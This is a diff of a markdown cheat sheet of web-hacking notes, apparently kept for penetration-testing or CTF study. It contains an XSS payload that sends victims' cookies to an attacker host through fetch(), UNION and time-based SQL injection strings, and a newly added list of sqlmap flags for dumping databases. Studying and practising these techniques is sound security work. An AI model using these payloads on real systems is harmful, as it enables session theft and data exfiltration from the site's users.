@@ -10,7 +10,7 @@
   - [Websocket](#websocket)
   - [Command injection](#command-injection)
   - [Authentication](#authentication)
-  - [database](#database)
+  - [DATABASE](#database)
     - [Steps](#steps)
     - [UNION](#union)
       - [Find data oracle](#find-data-oracle)
@@ -19,6 +19,7 @@
         - [sqlmap](#sqlmap)
         - [Provoking errors](#provoking-errors)
       - [Time](#time)
+    - [SQLMAP](#sqlmap-1)
 - [Burpsuite](#burpsuite)
   - [Repeater](#repeater)
   - [Intruder](#intruder)
@@ -104,7 +105,6 @@ Insecure Direct Object Request
 - Payload for shell: </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
 -                    </textarea><script>fetch('http://10.8.80.130:1234?cookie=' + btoa(document.cookie) );</script> 
 
-
 ## Websocket
 - Bidirectional
 - Exploit message content
@@ -128,7 +128,8 @@ Insecure Direct Object Request
   - enumerate username until valid one ==> NULL payload for password + several tries until get different response
   - try password with these usernames ==> grep warning for incorrect passwords
 
-## database
+## DATABASE
+
 ### Steps
 - find vulnerability: ', "
 - find total columns: UNION SELECT NULL,NULL,NULL
@@ -166,7 +167,6 @@ Insecure Direct Object Request
   - Microsoft, MySQL	SELECT @@version
   - Oracle	SELECT * FROM v$version
   - PostgreSQL	SELECT version()
-
 
 #### Find data oracle
 Oracle DB: '+UNION+SELECT+NULL,NULL+FROM+v$version--
@@ -248,6 +248,14 @@ Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table--
 admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
 admin123' UNION SELECT SLEEP(5),2;--
 
+### SQLMAP
+- -r /path/to/file
+- --level 2  
+- --risk 5
+- -D Database_Name
+- --tables / -T
+- --columns
+- --dump-all
 # Burpsuite
 
 ## Repeater
